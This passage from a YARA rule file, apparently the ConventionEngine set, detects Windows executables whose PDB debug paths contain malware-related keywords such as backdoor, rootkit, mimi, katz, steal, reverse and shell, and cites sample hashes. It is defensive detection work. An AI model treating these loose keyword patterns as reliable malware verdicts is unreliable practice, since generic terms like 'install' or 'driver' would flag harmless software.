 (uint16(0) == 0x5A4D) and uint32(uint32(0x3C)) == 0x00004550 and $pcre
}
rule ConventionEngine_Keyword_Backdoor
{
 meta:
 author = "@stvemillertime"
 description = "Searching for PE files with PDB path keywords, terms or anomalies."
 sample_md5 = "0017c2bfa513960f9ea4fee46382959b"
 ref_blog = "https://www.fireeye.com/blog/threat-research/2019/08/definitive-dossier-of-devilish-debug-details-part-one-pdb-paths-malware.html"
 strings:
 $pcre = /RSDS[\x00-\xFF]{20}[a-zA-Z]:\\[\x00-\xFF]{0,200}backdoor[\x00-\xFF]{0,200}\.pdb\x00/ nocase ascii
 condition:
 (uint16(0) == 0x5A4D) and uint32(uint32(0x3C)) == 0x00004550 and $pcre
}
rule ConventionEngine_Keyword_BDoor
{
 meta:
 author = "@stvemillertime"
 description = "Searching for PE files with PDB path keywords, terms or anomalies."
 sample_md5 = "ba08b593250c3ca5c13f56e2ca97d85e"
 ref_blog = "https://www.fireeye.com/blog/threat-research/2019/08/definitive-dossier-of-devilish-debug-details-part-one-pdb-paths-malware.html"
 strings:
 $pcre = /RSDS[\x00-\xFF]{20}[a-zA-Z]:\\[\x00-\xFF]{0,200}(bkdoor|bckdoor|backdr)[\x00-\xFF]{0,200}\.pdb\x00/ nocase ascii
 condition:
 (uint16(0) == 0x5A4D) and uint32(uint32(0x3C)) == 0x00004550 and $pcre
}
rule ConventionEngine_Keyword_Zombie
{
 meta:
 author = "@stvemillertime"
 description = "Searching for PE files with PDB path keywords, terms or anomalies."
 sample_md5 = "05ce6c5b7e14c34d4e6189dc19675c98"
 ref_blog = "https://www.fireeye.com/blog/threat-research/2019/08/definitive-dossier-of-devilish-debug-details-part-one-pdb-paths-malware.html"
 strings:
 $pcre = /RSDS[\x00-\xFF]{20}[a-zA-Z]:\\[\x00-\xFF]{0,200}zombie[\x00-\xFF]{0,200}\.pdb\x00/ nocase ascii
 condition:
 (uint16(0) == 0x5A4D) and uint32(uint32(0x3C)) == 0x00004550 and $pcre
}
rule ConventionEngine_Keyword_Rootkit
{
 meta:
 author = "@stvemillertime"
 description = "Searching for PE files with PDB path keywords, terms or anomalies."
 sample_md5 = "8d4c375e452c688b413882365437435b"
 ref_blog = "https://www.fireeye.com/blog/threat-research/2019/08/definitive-dossier-of-devilish-debug-details-part-one-pdb-paths-malware.html"
 strings:
 $pcre = /RSDS[\x00-\xFF]{20}[a-zA-Z]:\\[\x00-\xFF]{0,200}rootkit[\x00-\xFF]{0,200}\.pdb\x00/ nocase ascii
 condition:
 (uint16(0) == 0x5A4D) and uint32(uint32(0x3C)) == 0x00004550 and $pcre
}
rule ConventionEngine_Keyword_Fuck
{
 meta:
 author = "@stvemillertime"
 description = "Searching for PE files with PDB path keywords, terms or anomalies."
 sample_md5 = "bce1069dd099f15170c5fd05bae921b5"
 ref_blog = "https://www.fireeye.com/blog/threat-research/2019/08/definitive-dossier-of-devilish-debug-details-part-one-pdb-paths-malware.html"
 strings:
 $pcre = /RSDS[\x00-\xFF]{20}[a-zA-Z]:\\[\x00-\xFF]{0,200}fuck[\x00-\xFF]{0,200}\.pdb\x00/ nocase ascii
 condition:
 (uint16(0) == 0x5A4D) and uint32(uint32(0x3C)) == 0x00004550 and $pcre
}
rule ConventionEngine_Keyword_LoadDLL
{
 meta:
 author = "@stvemillertime"
 description = "Searching for PE files with PDB path keywords, terms or anomalies."
 sample_md5 = "e03f94cf5e3b1df208967a87df13ccb5"
 ref_blog = "https://www.fireeye.com/blog/threat-research/2019/08/definitive-dossier-of-devilish-debug-details-part-one-pdb-paths-malware.html"
 strings:
 $pcre = /RSDS[\x00-\xFF]{20}[a-zA-Z]:\\[\x00-\xFF]{0,200}loaddll[\x00-\xFF]{0,200}\.pdb\x00/ nocase ascii
 condition:
 (uint16(0) == 0x5A4D) and uint32(uint32(0x3C)) == 0x00004550 and $pcre
}
rule ConventionEngine_Keyword_Reflect
{
 meta:
 author = "@stvemillertime"
 description = "Searching for PE files with PDB path keywords, terms or anomalies."
 sample_md5 = "d4990a8d2ff6f2433acdad04521f85c6"
 ref_blog = "https://www.fireeye.com/blog/threat-research/2019/08/definitive-dossier-of-devilish-debug-details-part-one-pdb-paths-malware.html"
 strings:
 $pcre = /RSDS[\x00-\xFF]{20}[a-zA-Z]:\\[\x00-\xFF]{0,200}reflect[\x00-\xFF]{0,200}\.pdb\x00/ nocase ascii
 condition:
 (uint16(0) == 0x5A4D) and uint32(uint32(0x3C)) == 0x00004550 and $pcre
}
rule ConventionEngine_Keyword_Sleep
{
 meta:
 author = "@stvemillertime"
 description = "Searching for PE files with PDB path keywords, terms or anomalies."
 sample_md5 = "0ce134d66531d2070b2c7db1ffb0dc6f"
 ref_blog = "https://www.fireeye.com/blog/threat-research/2019/08/definitive-dossier-of-devilish-debug-details-part-one-pdb-paths-malware.html"
 strings:
 $pcre = /RSDS[\x00-\xFF]{20}[a-zA-Z]:\\[\x00-\xFF]{0,200}sleep[\x00-\xFF]{0,200}\.pdb\x00/ nocase ascii
 condition:
 (uint16(0) == 0x5A4D) and uint32(uint32(0x3C)) == 0x00004550 and $pcre
}
rule ConventionEngine_Keyword_Sploit
{
 meta:
 author = "@stvemillertime"
 description = "Searching for PE files with PDB path keywords, terms or anomalies."
 sample_md5 = "0637c45bdefaa93d26124c1f3899443a"
 ref_blog = "https://www.fireeye.com/blog/threat-research/2019/08/definitive-dossier-of-devilish-debug-details-part-one-pdb-paths-malware.html"
 strings:
 $pcre = /RSDS[\x00-\xFF]{20}[a-zA-Z]:\\[\x00-\xFF]{0,200}sploit[\x00-\xFF]{0,200}\.pdb\x00/ nocase ascii
 condition:
 (uint16(0) == 0x5A4D) and uint32(uint32(0x3C)) == 0x00004550 and $pcre
}
rule ConventionEngine_Keyword_Reverse
{
 meta:
 author = "@stvemillertime"
 description = "Searching for PE files with PDB path keywords, terms or anomalies."
 sample_md5 = "fccb98a9a510cdcf7c730eba548729de"
 ref_blog = "https://www.fireeye.com/blog/threat-research/2019/08/definitive-dossier-of-devilish-debug-details-part-one-pdb-paths-malware.html"
 strings:
 $pcre = /RSDS[\x00-\xFF]{20}[a-zA-Z]:\\[\x00-\xFF]{0,200}reverse[\x00-\xFF]{0,200}\.pdb\x00/ nocase ascii
 condition:
 (uint16(0) == 0x5A4D) and uint32(uint32(0x3C)) == 0x00004550 and $pcre
}
rule ConventionEngine_Keyword_Socket
{
 meta:
 author = "@stvemillertime"
 description = "Searching for PE files with PDB path keywords, terms or anomalies."
 sample_md5 = "9c836dcd5251c4c9272b408b486e65db"
 ref_blog = "https://www.fireeye.com/blog/threat-research/2019/08/definitive-dossier-of-devilish-debug-details-part-one-pdb-paths-malware.html"
 strings:
 $pcre = /RSDS[\x00-\xFF]{20}[a-zA-Z]:\\[\x00-\xFF]{0,200}socket[\x00-\xFF]{0,200}\.pdb\x00/ nocase ascii
 condition:
 (uint16(0) == 0x5A4D) and uint32(uint32(0x3C)) == 0x00004550 and $pcre
}
rule ConventionEngine_Keyword_PowerShell
{
 meta:
 author = "@stvemillertime"
 description = "Searching for PE files with PDB path keywords, terms or anomalies."
 sample_md5 = "33700535591774417e3282f7b40ae8ad"
 ref_blog = "https://www.fireeye.com/blog/threat-research/2019/08/definitive-dossier-of-devilish-debug-details-part-one-pdb-paths-malware.html"
 strings:
 $pcre = /RSDS[\x00-\xFF]{20}[a-zA-Z]:\\[\x00-\xFF]{0,200}PowerShell[\x00-\xFF]{0,200}\.pdb\x00/ nocase ascii
 condition:
 (uint16(0) == 0x5A4D) and uint32(uint32(0x3C)) == 0x00004550 and $pcre
}
rule ConventionEngine_Keyword_Infect
{
 meta:
 author = "@stvemillertime"
 description = "Searching for PE files with PDB path keywords, terms or anomalies."
 sample_md5 = "fdfea54231be21760b722d5cef32da2a"
 ref_blog = "https://www.fireeye.com/blog/threat-research/2019/08/definitive-dossier-of-devilish-debug-details-part-one-pdb-paths-malware.html"
 strings:
 $pcre = /RSDS[\x00-\xFF]{20}[a-zA-Z]:\\[\x00-\xFF]{0,200}infect[\x00-\xFF]{0,200}\.pdb\x00/ nocase ascii
 condition:
 (uint16(0) == 0x5A4D) and uint32(uint32(0x3C)) == 0x00004550 and $pcre
}
rule ConventionEngine_Keyword_Worm
{
 meta:
 author = "@stvemillertime"
 description = "Searching for PE files with PDB path keywords, terms or anomalies."
 sample_md5 = "fdfea54231be21760b722d5cef32da2a"
 ref_blog = "https://www.fireeye.com/blog/threat-research/2019/08/definitive-dossier-of-devilish-debug-details-part-one-pdb-paths-malware.html"
 strings:
 $pcre = /RSDS[\x00-\xFF]{20}[a-zA-Z]:\\[\x00-\xFF]{0,200}worm[\x00-\xFF]{0,200}\.pdb\x00/ nocase ascii
 condition:
 (uint16(0) == 0x5A4D) and uint32(uint32(0x3C)) == 0x00004550 and $pcre
}
rule ConventionEngine_Keyword_Katz
{
 meta:
 author = "@stvemillertime"
 description = "Searching for PE files with PDB path keywords, terms or anomalies."
 sample_md5 = "0512c5a8807e4fdeb662e61d81cd1645"
 ref_blog = "https://www.fireeye.com/blog/threat-research/2019/08/definitive-dossier-of-devilish-debug-details-part-one-pdb-paths-malware.html"
 strings:
 $pcre = /RSDS[\x00-\xFF]{20}[a-zA-Z]:\\[\x00-\xFF]{0,200}katz[\x00-\xFF]{0,200}\.pdb\x00/ nocase ascii
 condition:
 (uint16(0) == 0x5A4D) and uint32(uint32(0x3C)) == 0x00004550 and $pcre
}
rule ConventionEngine_Keyword_Mimi
{
 meta:
 author = "@stvemillertime"
 description = "Searching for PE files with PDB path keywords, terms or anomalies."
 sample_md5 = "a2bcbcc1465be96fbb957b14f29d1ea4"
 ref_blog = "https://www.fireeye.com/blog/threat-research/2019/08/definitive-dossier-of-devilish-debug-details-part-one-pdb-paths-malware.html"
 strings:
 $pcre = /RSDS[\x00-\xFF]{20}[a-zA-Z]:\\[\x00-\xFF]{0,200}mimi[\x00-\xFF]{0,200}\.pdb\x00/ nocase ascii
 condition:
 (uint16(0) == 0x5A4D) and uint32(uint32(0x3C)) == 0x00004550 and $pcre
}
rule ConventionEngine_Keyword_Droper
{
 meta:
 author = "@stvemillertime"
 description = "Searching for PE files with PDB path keywords, terms or anomalies."
 sample_md5 = "5410ab108cd251a2db724db762d6606c"
 ref_blog = "https://www.fireeye.com/blog/threat-research/2019/08/definitive-dossier-of-devilish-debug-details-part-one-pdb-paths-malware.html"
 strings:
 $pcre = /RSDS[\x00-\xFF]{20}[a-zA-Z]:\\[\x00-\xFF]{0,200}droper[\x00-\xFF]{0,200}\.pdb\x00/ nocase ascii
 condition:
 (uint16(0) == 0x5A4D) and uint32(uint32(0x3C)) == 0x00004550 and $pcre
}
rule ConventionEngine_Keyword_0day
{
 meta:
 author = "@a_tweeter_user"
 description = "Searching for PE files with PDB path keywords, terms or anomalies."
 sample_md5 = "e8df15f480b7044cf44faff4273dba8f"
 ref_blog = "https://www.fireeye.com/blog/threat-research/2019/08/definitive-dossier-of-devilish-debug-details-part-one-pdb-paths-malware.html"
 strings:
 $pcre = /RSDS[\x00-\xFF]{20}[a-zA-Z]:\\[\x00-\xFF]{0,200}0day[\x00-\xFF]{0,200}\.pdb\x00/ nocase ascii
 condition:
 (uint16(0) == 0x5A4D) and uint32(uint32(0x3C)) == 0x00004550 and $pcre
}
rule ConventionEngine_Keyword_Penetration
{
 meta:
 author = "@stvemillertime"
 description = "Searching for PE files with PDB path keywords, terms or anomalies."
 sample_md5 = "5f7796346d22ec5bd8c7b5a2e6caca3c"
 ref_blog = "https://www.fireeye.com/blog/threat-research/2019/08/definitive-dossier-of-devilish-debug-details-part-one-pdb-paths-malware.html"
 strings:
 $pcre = /RSDS[\x00-\xFF]{20}[a-zA-Z]:\\[\x00-\xFF]{0,200}penetration[\x00-\xFF]{0,200}\.pdb\x00/ nocase ascii
 condition:
 (uint16(0) == 0x5A4D) and uint32(uint32(0x3C)) == 0x00004550 and $pcre
}
rule ConventionEngine_Keyword_Wiper
{
 meta:
 author = "@stvemillertime"
 description = "Searching for PE files with PDB path keywords, terms or anomalies."
 sample_md5 = "3b740cca401715985f3a0c28f851b60e"
 ref_blog = "https://www.fireeye.com/blog/threat-research/2019/08/definitive-dossier-of-devilish-debug-details-part-one-pdb-paths-malware.html"
 strings:
 $pcre = /RSDS[\x00-\xFF]{20}[a-zA-Z]:\\[\x00-\xFF]{0,200}wiper[\x00-\xFF]{0,200}\.pdb\x00/ nocase ascii
 condition:
 (uint16(0) == 0x5A4D) and uint32(uint32(0x3C)) == 0x00004550 and $pcre
}
rule ConventionEngine_Keyword_Bootkit
{
 meta:
 author = "@stvemillertime"
 description = "Searching for PE files with PDB path keywords, terms or anomalies."
 sample_md5 = "b427a55b62d7f00c532d695c9b04b4d2"
 ref_blog = "https://www.fireeye.com/blog/threat-research/2019/08/definitive-dossier-of-devilish-debug-details-part-one-pdb-paths-malware.html"
 strings:
 $pcre = /RSDS[\x00-\xFF]{20}[a-zA-Z]:\\[\x00-\xFF]{0,200}bootkit[\x00-\xFF]{0,200}\.pdb\x00/ nocase ascii
 condition:
 (uint16(0) == 0x5A4D) and uint32(uint32(0x3C)) == 0x00004550 and $pcre
}
rule ConventionEngine_Keyword_Bot
{
 meta:
 author = "@stvemillertime"
 description = "Searching for PE files with PDB path keywords, terms or anomalies."
 sample_md5 = "df1e54a3832aff3e714fa2c122aa7ea9"
 ref_blog = "https://www.fireeye.com/blog/threat-research/2019/08/definitive-dossier-of-devilish-debug-details-part-one-pdb-paths-malware.html"
 strings:
 $pcre = /RSDS[\x00-\xFF]{20}[a-zA-Z]:\\[\x00-\xFF]{0,200}(bot_|_bot| bot|bot |bot\\|-bot|bot-|\\bot)[\x00-\xFF]{0,200}\.pdb\x00/ nocase ascii
 condition:
 (uint16(0) == 0x5A4D) and uint32(uint32(0x3C)) == 0x00004550 and $pcre
}
rule ConventionEngine_Keyword_Csrss
{
 meta:
 author = "@stvemillertime"
 description = "Searching for PE files with PDB path keywords, terms or anomalies."
 sample_md5 = "72e743f7752367b461c42561021eb30d"
 ref_blog = "https://www.fireeye.com/blog/threat-research/2019/08/definitive-dossier-of-devilish-debug-details-part-one-pdb-paths-malware.html"
 strings:
 $pcre = /RSDS[\x00-\xFF]{20}[a-zA-Z]:\\[\x00-\xFF]{0,200}csrss[\x00-\xFF]{0,200}\.pdb\x00/ nocase ascii
 condition:
 (uint16(0) == 0x5A4D) and uint32(uint32(0x3C)) == 0x00004550 and $pcre
}
rule ConventionEngine_Keyword_Flood
{
 meta:
 author = "@stvemillertime"
 description = "Searching for PE files with PDB path keywords, terms or anomalies."
 sample_md5 = "17a8d440545859444491f2feca7c129f"
 ref_blog = "https://www.fireeye.com/blog/threat-research/2019/08/definitive-dossier-of-devilish-debug-details-part-one-pdb-paths-malware.html"
 strings:
 $pcre = /RSDS[\x00-\xFF]{20}[a-zA-Z]:\\[\x00-\xFF]{0,200}flood[\x00-\xFF]{0,200}\.pdb\x00/ nocase ascii
 condition:
 (uint16(0) == 0x5A4D) and uint32(uint32(0x3C)) == 0x00004550 and $pcre
}
rule ConventionEngine_Keyword_Overflow
{
 meta:
 author = "@stvemillertime"
 description = "Searching for PE files with PDB path keywords, terms or anomalies."
 ref_blog = "https://www.fireeye.com/blog/threat-research/2019/08/definitive-dossier-of-devilish-debug-details-part-one-pdb-paths-malware.html"
 strings:
 $pcre = /RSDS[\x00-\xFF]{20}[a-zA-Z]:\\[\x00-\xFF]{0,200}overflow[\x00-\xFF]{0,200}\.pdb\x00/ nocase ascii
 condition:
 (uint16(0) == 0x5A4D) and uint32(uint32(0x3C)) == 0x00004550 and $pcre
}
rule ConventionEngine_Keyword_Kali
{
 meta:
 author = "@stvemillertime"
 description = "Searching for PE files with PDB path keywords, terms or anomalies."
 sample_md5 = "2cc23a6d971a8dc2093b73f72c2380b4"
 ref_blog = "https://www.fireeye.com/blog/threat-research/2019/08/definitive-dossier-of-devilish-debug-details-part-one-pdb-paths-malware.html"
 strings:
 $pcre = /RSDS[\x00-\xFF]{20}[a-zA-Z]:\\[\x00-\xFF]{0,200}kali[\x00-\xFF]{0,200}\.pdb\x00/ nocase ascii
 condition:
 (uint16(0) == 0x5A4D) and uint32(uint32(0x3C)) == 0x00004550 and $pcre
}
rule ConventionEngine_Keyword_Malware
{
 meta:
 author = "@stvemillertime"
 description = "Searching for PE files with PDB path keywords, terms or anomalies."
 sample_md5 = "198ee041e8f3eb12a19bc321f86ccb88"
 ref_blog = "https://www.fireeye.com/blog/threat-research/2019/08/definitive-dossier-of-devilish-debug-details-part-one-pdb-paths-malware.html"
 strings:
 $pcre = /RSDS[\x00-\xFF]{20}[a-zA-Z]:\\[\x00-\xFF]{0,200}malware[\x00-\xFF]{0,200}\.pdb\x00/ nocase ascii
 condition:
 (uint16(0) == 0x5A4D) and uint32(uint32(0x3C)) == 0x00004550 and $pcre
}
rule ConventionEngine_Keyword_Miner
{
 meta:
 author = "@stvemillertime"
 description = "Searching for PE files with PDB path keywords, terms or anomalies."
 sample_md5 = "0409644ae4d1afb21c53339e244b5cc8"
 ref_blog = "https://www.fireeye.com/blog/threat-research/2019/08/definitive-dossier-of-devilish-debug-details-part-one-pdb-paths-malware.html"
 strings:
 $pcre = /RSDS[\x00-\xFF]{20}[a-zA-Z]:\\[\x00-\xFF]{0,200}miner[\x00-\xFF]{0,200}\.pdb\x00/ nocase ascii
 condition:
 (uint16(0) == 0x5A4D) and uint32(uint32(0x3C)) == 0x00004550 and $pcre
}
rule ConventionEngine_Keyword_Xmrig
{
 meta:
 author = "@stvemillertime"
 description = "Searching for PE files with PDB path keywords, terms or anomalies."
 sample_md5 = "433f936511c2302342f175ad020e34f1"
 ref_blog = "https://www.fireeye.com/blog/threat-research/2019/08/definitive-dossier-of-devilish-debug-details-part-one-pdb-paths-malware.html"
 strings:
 $pcre = /RSDS[\x00-\xFF]{20}[a-zA-Z]:\\[\x00-\xFF]{0,200}xmrig[\x00-\xFF]{0,200}\.pdb\x00/ nocase ascii
 condition:
 (uint16(0) == 0x5A4D) and uint32(uint32(0x3C)) == 0x00004550 and $pcre
}
rule ConventionEngine_Keyword_LOL
{
 meta:
 author = "@stvemillertime"
 description = "Searching for PE files with PDB path keywords, terms or anomalies."
 sample_md5 = "05486e8707ae94befde0bafd9bee5429"
 ref_blog = "https://www.fireeye.com/blog/threat-research/2019/08/definitive-dossier-of-devilish-debug-details-part-one-pdb-paths-malware.html"
 strings:
 $pcre = /RSDS[\x00-\xFF]{20}[a-zA-Z]:\\[\x00-\xFF]{0,200}lol[\x00-\xFF]{0,200}\.pdb\x00/ nocase ascii
 condition:
 (uint16(0) == 0x5A4D) and uint32(uint32(0x3C)) == 0x00004550 and $pcre
}
rule ConventionEngine_Keyword_FUD
{
 meta:
 author = "@stvemillertime"
 description = "Searching for PE files with PDB path keywords, terms or anomalies."
 sample_md5 = "07c281acbe2eeb479a73580560cec0b8"
 ref_blog = "https://www.fireeye.com/blog/threat-research/2019/08/definitive-dossier-of-devilish-debug-details-part-one-pdb-paths-malware.html"
 strings:
 $pcre = /RSDS[\x00-\xFF]{20}[a-zA-Z]:\\[\x00-\xFF]{0,200}fud[\x00-\xFF]{0,200}\.pdb\x00/ nocase ascii
 condition:
 (uint16(0) == 0x5A4D) and uint32(uint32(0x3C)) == 0x00004550 and $pcre
}
rule ConventionEngine_Keyword_Install
{
 meta:
 author = "@stvemillertime"
 description = "Searching for PE files with PDB path keywords, terms or anomalies."
 sample_md5 = "74494aff87db1ef5843cbf8c4d40cab1"
 ref_blog = "https://www.fireeye.com/blog/threat-research/2019/08/definitive-dossier-of-devilish-debug-details-part-one-pdb-paths-malware.html"
 strings:
 $pcre = /RSDS[\x00-\xFF]{20}[a-zA-Z]:\\[\x00-\xFF]{0,200}install[\x00-\xFF]{0,200}\.pdb\x00/ nocase ascii
 condition:
 (uint16(0) == 0x5A4D) and uint32(uint32(0x3C)) == 0x00004550 and $pcre
}
rule ConventionEngine_Keyword_Steal
{
 meta:
 author = "@stvemillertime"
 description = "Searching for PE files with PDB path keywords, terms or anomalies."
 sample_md5 = "f3f47f3986e9c55d36c49beefa627b54"
 ref_blog = "https://www.fireeye.com/blog/threat-research/2019/08/definitive-dossier-of-devilish-debug-details-part-one-pdb-paths-malware.html"
 strings:
 $pcre = /RSDS[\x00-\xFF]{20}[a-zA-Z]:\\[\x00-\xFF]{0,200}steal[\x00-\xFF]{0,200}\.pdb\x00/ nocase ascii
 condition:
 (uint16(0) == 0x5A4D) and uint32(uint32(0x3C)) == 0x00004550 and $pcre
}
rule ConventionEngine_Keyword_Launch
{
 meta:
 author = "@stvemillertime"
 description = "Searching for PE files with PDB path keywords, terms or anomalies."
 ref_blog = "https://www.fireeye.com/blog/threat-research/2019/08/definitive-dossier-of-devilish-debug-details-part-one-pdb-paths-malware.html"
 strings:
 $pcre = /RSDS[\x00-\xFF]{20}[a-zA-Z]:\\[\x00-\xFF]{0,200}launch[\x00-\xFF]{0,200}\.pdb\x00/ nocase ascii
 condition:
 (uint16(0) == 0x5A4D) and uint32(uint32(0x3C)) == 0x00004550 and $pcre
}
rule ConventionEngine_Keyword_Downloader
{
 meta:
 author = "@stvemillertime"
 description = "Searching for PE files with PDB path keywords, terms or anomalies."
 sample_md5 = "8c843aa6ded2f2cb4a78a8b4534ac063"
 ref_blog = "https://www.fireeye.com/blog/threat-research/2019/08/definitive-dossier-of-devilish-debug-details-part-one-pdb-paths-malware.html"
 strings:
 $pcre = /RSDS[\x00-\xFF]{20}[a-zA-Z]:\\[\x00-\xFF]{0,200}downloader[\x00-\xFF]{0,200}\.pdb\x00/ nocase ascii
 condition:
 (uint16(0) == 0x5A4D) and uint32(uint32(0x3C)) == 0x00004550 and $pcre
}
rule ConventionEngine_Keyword_Hack
{
 meta:
 author = "@stvemillertime"
 description = "Searching for PE files with PDB path keywords, terms or anomalies."
 sample_md5 = "afe58fee2460947291e93bad9fb095ce"
 ref_blog = "https://www.fireeye.com/blog/threat-research/2019/08/definitive-dossier-of-devilish-debug-details-part-one-pdb-paths-malware.html"
 strings:
 $pcre = /RSDS[\x00-\xFF]{20}[a-zA-Z]:\\[\x00-\xFF]{0,200}hack[\x00-\xFF]{0,200}\.pdb\x00/ nocase ascii
 condition:
 (uint16(0) == 0x5A4D) and uint32(uint32(0x3C)) == 0x00004550 and $pcre
}
rule ConventionEngine_Keyword_Kill
{
 meta:
 author = "@stvemillertime"
 description = "Searching for PE files with PDB path keywords, terms or anomalies."
 sample_md5 = "6d250a11f68b1fd4ed0505fb2965b6f7"
 ref_blog = "https://www.fireeye.com/blog/threat-research/2019/08/definitive-dossier-of-devilish-debug-details-part-one-pdb-paths-malware.html"
 strings:
 $pcre = /RSDS[\x00-\xFF]{20}[a-zA-Z]:\\[\x00-\xFF]{0,200}kill[\x00-\xFF]{0,200}\.pdb\x00/ nocase ascii
 condition:
 (uint16(0) == 0x5A4D) and uint32(uint32(0x3C)) == 0x00004550 and $pcre
}
rule ConventionEngine_Keyword_Implant
{
 meta:
 author = "@stvemillertime"
 description = "Searching for PE files with PDB path keywords, terms or anomalies."
 sample_md5 = "40451f20371329b992fb1b85c754d062"
 ref_blog = "https://www.fireeye.com/blog/threat-research/2019/08/definitive-dossier-of-devilish-debug-details-part-one-pdb-paths-malware.html"
 strings:
 $pcre = /RSDS[\x00-\xFF]{20}[a-zA-Z]:\\[\x00-\xFF]{0,200}implant[\x00-\xFF]{0,200}\.pdb\x00/ nocase ascii
 condition:
 (uint16(0) == 0x5A4D) and uint32(uint32(0x3C)) == 0x00004550 and $pcre and filesize < 3MB
}
rule ConventionEngine_Keyword_RAT
{
 meta:
 author = "@stvemillertime"
 description = "Searching for PE files with PDB path keywords, terms or anomalies."
 sample_md5 = "18244062e6169b79f68d9b413cfd2c04"
 ref_blog = "https://www.fireeye.com/blog/threat-research/2019/08/definitive-dossier-of-devilish-debug-details-part-one-pdb-paths-malware.html"
 strings:
 $pcre = /RSDS[\x00-\xFF]{20}[a-zA-Z]:\\[\x00-\xFF]{0,200}(\\rat|rat\\|\srat|\-rat|rat\.|rat\s)[\x00-\xFF]{0,200}\.pdb\x00/ nocase ascii
 $this = /RSDS[\x00-\xFF]{20}[a-zA-Z]:\\[\x00-\xFF]{0,200}administrator[\x00-\xFF]{0,200}\.pdb\x00/ nocase ascii
 condition:
 (uint16(0) == 0x5A4D) and uint32(uint32(0x3C)) == 0x00004550 and $pcre and not $this
}
rule ConventionEngine_Keyword_Shell
{
 meta:
 author = "@stvemillertime"
 description = "Searching for PE files with PDB path keywords, terms or anomalies."
 sample_md5 = "32a16eff23f6c35e22b0b7d041728f62"
 ref_blog = "https://www.fireeye.com/blog/threat-research/2019/08/definitive-dossier-of-devilish-debug-details-part-one-pdb-paths-malware.html"
 strings:
 $pcre = /RSDS[\x00-\xFF]{20}[a-zA-Z]:\\[\x00-\xFF]{0,200}shell[\x00-\xFF]{0,200}\.pdb\x00/ nocase ascii
 $this = /RSDS[\x00-\xFF]{20}[a-zA-Z]:\\[\x00-\xFF]{0,200}(shellcode|powershell)[\x00-\xFF]{0,200}\.pdb\x00/ nocase ascii
 condition:
 (uint16(0) == 0x5A4D) and uint32(uint32(0x3C)) == 0x00004550 and $pcre and not $this
}
rule ConventionEngine_Keyword_Admin
{
 meta:
 author = "@stvemillertime"
 description = "Searching for PE files with PDB path keywords, terms or anomalies."
 sample_md5 = "67fff57bb44d3458b17f0c7a7a45f405"
 ref_blog = "https://www.fireeye.com/blog/threat-research/2019/08/definitive-dossier-of-devilish-debug-details-part-one-pdb-paths-malware.html"
 strings:
 $pcre = /RSDS[\x00-\xFF]{20}[a-zA-Z]:\\[\x00-\xFF]{0,200}Admin[\x00-\xFF]{0,200}\.pdb\x00/ nocase ascii
 $this = /RSDS[\x00-\xFF]{20}[a-zA-Z]:\\[\x00-\xFF]{0,200}administrator[\x00-\xFF]{0,200}\.pdb\x00/ nocase ascii
 condition:
 (uint16(0) == 0x5A4D) and uint32(uint32(0x3C)) == 0x00004550 and $pcre and not $this
}
rule ConventionEngine_Keyword_Proxy
{
 meta:
 author = "@stvemillertime"
 description = "Searching for PE files with PDB path keywords, terms or anomalies."
 sample_md5 = "7486404888b3223ef171a310426b2387"
 ref_blog = "https://www.fireeye.com/blog/threat-research/2019/08/definitive-dossier-of-devilish-debug-details-part-one-pdb-paths-malware.html"
 strings:
 $pcre = /RSDS[\x00-\xFF]{20}[a-zA-Z]:\\[\x00-\xFF]{0,200}proxy[\x00-\xFF]{0,200}\.pdb\x00/ nocase ascii
 condition:
 (uint16(0) == 0x5A4D) and uint32(uint32(0x3C)) == 0x00004550 and $pcre
}
rule ConventionEngine_Keyword_Virus
{
 meta:
 author = "@stvemillertime"
 description = "Searching for PE files with PDB path keywords, terms or anomalies."
 sample_md5 = "5a537470e936dbb9611f95fb7f136a6e"
 ref_blog = "https://www.fireeye.com/blog/threat-research/2019/08/definitive-dossier-of-devilish-debug-details-part-one-pdb-paths-malware.html"
 strings:
 $pcre = /RSDS[\x00-\xFF]{20}[a-zA-Z]:\\[\x00-\xFF]{0,200}virus[\x00-\xFF]{0,200}\.pdb\x00/ nocase ascii
 condition:
 (uint16(0) == 0x5A4D) and uint32(uint32(0x3C)) == 0x00004550 and $pcre
}
rule ConventionEngine_Keyword_Bind
{
 meta:
 author = "@stvemillertime"
 description = "Searching for PE files with PDB path keywords, terms or anomalies."
 sample_md5 = "0a2d51b0e58e41407f1a08744f1443b0"
 ref_blog = "https://www.fireeye.com/blog/threat-research/2019/08/definitive-dossier-of-devilish-debug-details-part-one-pdb-paths-malware.html"
 strings:
 $pcre = /RSDS[\x00-\xFF]{20}[a-zA-Z]:\\[\x00-\xFF]{0,200}bind[\x00-\xFF]{0,200}\.pdb\x00/ nocase ascii
 condition:
 (uint16(0) == 0x5A4D) and uint32(uint32(0x3C)) == 0x00004550 and $pcre
}
rule ConventionEngine_Keyword_1337
{
 meta:
 author = "@itsreallynick"
 description = "Searching for PE files with PDB path keywords, terms or anomalies. -YOUR BOY CARR"
 sample_md5 = "e9ecca14f19fe192fc48e714a649cadd"
 ref_blog = "https://www.fireeye.com/blog/threat-research/2019/08/definitive-dossier-of-devilish-debug-details-part-one-pdb-paths-malware.html"
 strings:
 $pcre = /RSDS[\x00-\xFF]{20}[a-zA-Z]?:?\\[\\\s|*\s]?.{0,250}\\[l1]33[7t][\\\s|*\s]?.{0,250}\.pdb\x00/ nocase
 condition:
 (uint16(0) == 0x5A4D) and uint32(uint32(0x3C)) == 0x00004550 and $pcre
}
rule ConventionEngine_Keyword_Thinstall
{
 meta:
 author = "@stvemillertime"
 description = "Searching for PE files with PDB path keywords, terms or anomalies."
 sample_md5 = "2ef545036c95aab395f3f2a3a0d38a9f"
 ref_blog = "https://www.fireeye.com/blog/threat-research/2019/08/definitive-dossier-of-devilish-debug-details-part-one-pdb-paths-malware.html"
 strings:
 $pcre = /RSDS[\x00-\xFF]{20}[a-zA-Z]:\\[\x00-\xFF]{0,200}thinstall[\x00-\xFF]{0,200}\.pdb\x00/ nocase ascii
 condition:
 (uint16(0) == 0x5A4D) and uint32(uint32(0x3C)) == 0x00004550 and $pcre
}
rule ConventionEngine_Keyword_Driver
{
 meta:
 author = "@stvemillertime"
 description = "Searching for PE files with PDB path keywords, terms or anomalies."
 sample_md5 = "24a6ec8ebf9c0867ed1c097f4a653b8d"
 ref_blog = "https://www.fireeye.com/blog/threat-research/2019/08/definitive-dossier-of-devilish-debug-details-part-one-pdb-paths-malware.html"
 strings:
 $pcre = /RSDS[\x00-\xFF]{20}[a-zA-Z]:\\[\x00-\xFF]{0,200}driver[\x00-\xFF]{0,200}\.pdb\x00/ nocase ascii
 condition:
